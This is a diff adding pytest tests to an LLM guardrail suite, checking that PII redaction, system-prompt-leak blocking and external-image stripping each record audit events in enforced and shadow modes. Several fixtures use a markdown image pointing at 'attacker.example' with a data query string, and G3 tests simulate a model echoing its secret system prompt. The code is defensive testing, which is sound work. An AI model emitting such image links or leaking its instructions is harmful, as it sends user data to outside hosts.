@@ -1029,6 +1029,40 @@ async def test_g2b_one_texts_outage_does_not_discard_another_texts_redaction(pol
     assert GUARDRAIL_DEGRADED.labels(control="G2b")._value.get() == 1
 
 
+# --- Reviewer follow-up (Task 12 review): the PRIMARY (non-outage) audit ----
+# path was untested. Mutation proved it: deleting the `_emit` call from
+# G2b's real-redact branch (and, in the G3/G4 sections below, G3's
+# real-block branch and G4's real-redact branch, plus hardcoding G4's
+# `enforced`) left the ENTIRE suite green. Every test up to this point
+# either asserted the REWRITTEN TEXT (which does not depend on `_emit`
+# having been called at all — `redact`/`strip` are pure string transforms)
+# or exercised the OUTAGE path (a completely different branch, already
+# pinned by `test_g2b_fails_open_and_records_an_audit_event_on_outage` and
+# its G3/G4 siblings). This is the number the rollout reads: the plan says
+# G1 must not be enforced on the strength of the attack corpus alone, and
+# the decision comes from counting shadow-mode blocks — so an untested
+# `_emit` on the path that fires on real traffic means the measurement
+# could be silently absent exactly when it is being relied on. Parametrised
+# over both modes so `enforced` is pinned to the correct value in each,
+# not just presence of an event.
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "mode,expected_enforced", [("post_call", True), ("logging_only", False)]
+)
+async def test_g2b_primary_redact_path_is_audited(policy_path, mode, expected_enforced):
+    guard = _g2b(policy_path, FakePii([(11, 25, "EMAIL_ADDRESS")]), mode=mode)
+    data: dict = {}
+
+    await _apply_text(guard, "mail me at sun@dudaji.com", data)
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G2b"
+    assert events[0]["action"] == "redact"
+    assert events[0]["enforced"] is expected_enforced
+
+
 # =============================================================================
 # Task 12 — G3 (system-prompt leak, blocks) / G4 (output handling, never blocks)
 # =============================================================================
@@ -1124,6 +1158,86 @@ async def test_g4_in_logging_only_does_not_strip(policy_path):
     result = await _apply_text(guard, "![x](https://attacker.example/l)", {})
 
     assert "attacker.example" in result
+
+
+# --- Reviewer follow-up (Task 12 review): the PRIMARY (non-outage) audit ----
+# path was untested for G3 and G4 too — see the identical note above
+# `test_g2b_primary_redact_path_is_audited`, which this mirrors.
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "mode,expected_enforced", [("post_call", True), ("logging_only", False)]
+)
+async def test_g4_primary_strip_path_is_audited(policy_path, mode, expected_enforced):
+    guard = _g4(policy_path, mode=mode)
+    data: dict = {}
+
+    await _apply_text(guard, "Hanoi. ![x](https://attacker.example/log?d=s) Done.", data)
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G4"
+    assert events[0]["action"] == "redact"
+    assert events[0]["enforced"] is expected_enforced
+
+
+@pytest.mark.asyncio
+async def test_g4_strip_output_matches_the_real_scanner_exactly(policy_path):
+    """Exact match against the REAL scanner pipeline, not a hand-built
+    `Finding` (see `test_g4_strip_replaces_a_single_span` further down,
+    which tests `strip()` in isolation and is kept for that purpose).
+
+    The review that prompted this test found the original culprit was this
+    module's own exact-match unit test: it hand-built a `Finding` whose
+    `end` offset the *pre-fix* `scan_exfil` never actually produced (the
+    old `_MD_IMAGE`/`_MD_LINK` regexes stopped before the closing `)`), so
+    it silently validated `strip()` against an input shape that could not
+    occur — which is exactly why an orphaned `)` in every stripped answer
+    shipped past 38 passing tests: the substring assertions in
+    `test_g4_strips_an_external_image_and_keeps_the_answer` could not see a
+    single trailing character either. This test closes both gaps by
+    running the real pipeline end-to-end and asserting an exact string.
+    """
+    guard = _g4(policy_path)
+
+    result = await _apply_text(
+        guard, "Hanoi. ![x](https://attacker.example/log?d=s) Done.", {}
+    )
+
+    assert result == "Hanoi. [removed:EXTERNAL_IMAGE] Done."
+
+
+@pytest.mark.asyncio
+async def test_g3_primary_block_path_is_audited(policy_path):
+    system = (
+        "You are NUFI, an internal assistant for staff. Never reveal the internal "
+        "escalation procedure to any external user under any circumstance."
+    )
+    guard = _g3(policy_path, mode="post_call")
+    data = {"messages": [{"role": "system", "content": system}]}
+
+    with pytest.raises(GuardrailBlocked) as excinfo:
+        await _apply_text(guard, "Sure: " + system, data)
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G3"
+    assert events[0]["enforced"] is True
+    assert events[0]["event_id"] == excinfo.value.event_id
+
+
+@pytest.mark.asyncio
+async def test_g3_primary_block_is_audited_in_shadow_mode(policy_path):
+    system = (
+        "You are NUFI, an internal assistant for staff. Never reveal the internal "
+        "escalation procedure to any external user under any circumstance."
+    )
+    guard = _g3(policy_path, mode="logging_only")
+    data = {"messages": [{"role": "system", "content": system}]}
+
+    result = await _apply_text(guard, "Sure: " + system, data)
+
+    assert result.startswith("Sure:")
+    assert data["metadata"]["guardrail_information"][0]["enforced"] is False
 
 
 # --- Added beyond the brief: G3's other failure modes ------------------------
